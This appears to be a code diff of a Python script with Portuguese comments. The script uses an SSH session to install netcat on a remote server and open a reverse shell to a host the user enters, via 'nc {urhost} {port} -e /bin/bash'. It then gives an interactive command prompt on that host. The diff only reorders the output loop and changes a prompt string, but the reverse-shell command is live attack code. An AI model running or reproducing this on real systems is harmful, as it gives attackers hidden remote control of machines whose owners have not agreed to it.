@@ -21,12 +21,12 @@ def exe_terminal(host=host):
         urhost = input("Enter your host: ")
         cmd = ("sudo apt update && sudo apt install netcat-traditional -y" + f"nc {urhost} {port} -e /bin/bash") #Comando para instalar o netcat-traditional e criar a conexão reversa
         stdin, stdout, stderr = c.exec_command(cmd)
-        while True:
-            print(stdout.read().decode())
-            err = stderr.read().decode()
-            if err:
-                print(f"Error {err}")
-            print("Starting reverse shell...")           #No seu terminal nc -lvp e a porta que você escolheu para receber a conexão reversa    #arrumar aqui
+        print(stdout.read().decode())
+        err = stderr.read().decode()
+        if err:
+            print(f"Error {err}")
+        print("Starting reverse shell...")
+        while True:           #No seu terminal nc -lvp e a porta que você escolheu para receber a conexão reversa    #arrumar aqui
             stdin, stdout, stderr = c.exec_command(input(f"Host {host}$~ Your command on host: "))
             output = stdout.readline()
             if output:
@@ -43,7 +43,7 @@ def exe_terminal(host=host):
     elif choose == "1":
         print("You can now execute commands on the remote server. Type 'exit' to disconnect.\n")  
         while True:
-            command = input(f"{host}$~ Your command on host: ")
+            command = input(f"{host} $~ Your command on host: ")
             if command.lower() == 'exit':
                 print("Disconnecting from the SSH server...")
                 c.close()
